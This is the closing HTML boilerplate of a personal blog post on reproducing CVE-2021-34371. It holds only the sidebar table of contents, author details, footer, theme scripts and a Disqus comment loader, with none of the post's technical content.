      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">配置环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%84%E8%A3%85exp"><span class="nav-number">2.</span> <span class="nav-text">组装exp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exploit"><span class="nav-number">3.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%AE%9A%E4%BD%8D%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="nav-number">3.1.</span> <span class="nav-text">调试定位漏洞原因</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Harry Smith"
      src="https://raw.githubusercontent.com/LycsHub/ImageHosting/master/natumetakasi-2021-11-318%3A56%3A10.jpg">
  <p class="site-author-name" itemprop="name">Harry Smith</p>
  <div class="site-description" itemprop="description">取次花丛懒回顾，半缘修道半缘君</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">42</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">24</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry Smith</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script>
  function loadCount() {
    var d = document, s = d.createElement('script');
    s.src = 'https://harrysmith-1.disqus.com/count.js';
    s.id = 'dsq-count-scr';
    (d.head || d.body).appendChild(s);
  }
  // defer loading until the whole page loading is completed
  window.addEventListener('load', loadCount, false);
</script>
<script>
  var disqus_config = function() {
    this.page.url = "https://lycshub.github.io/2022/06/04/%E5%A4%8D%E7%8E%B0cve-2021-34371/";
    this.page.identifier = "2022/06/04/复现cve-2021-34371/";
    this.page.title = "复现cve-2021-34371";
    };
  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
    if (window.DISQUS) {
      DISQUS.reset({
        reload: true,
        config: disqus_config
      });
    } else {
      var d = document, s = d.createElement('script');
      s.src = 'https://harrysmith-1.disqus.com/embed.js';
      s.setAttribute('data-timestamp', '' + +new Date());
      (d.head || d.body).appendChild(s);
    }
  });
</script>

</body>
</html>
